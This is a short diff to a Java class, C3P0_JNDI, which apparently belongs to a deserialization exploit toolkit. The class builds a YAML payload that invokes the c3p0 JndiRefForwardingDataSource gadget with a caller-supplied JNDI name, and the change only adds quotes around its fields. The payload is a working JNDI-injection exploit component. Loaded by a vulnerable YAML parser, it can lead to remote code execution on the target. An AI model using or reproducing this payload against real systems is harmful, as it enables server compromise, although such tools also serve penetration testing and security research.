@@ -8,8 +8,8 @@ public class C3P0_JNDI implements ObjectPayload<Object> {
     @Override
     public Object getObject(final String command) throws Exception {
         String yamlPayload = String.format("!!com.mchange.v2.c3p0.JndiRefForwardingDataSource \n" +
-            " jndiName: %s\n" +
-            " loginTimeout: 0",command);
+            " \"jndiName\": \"%s\"\n" +
+            " \"loginTimeout\": 0",command);
         return yamlPayload;
     }
 
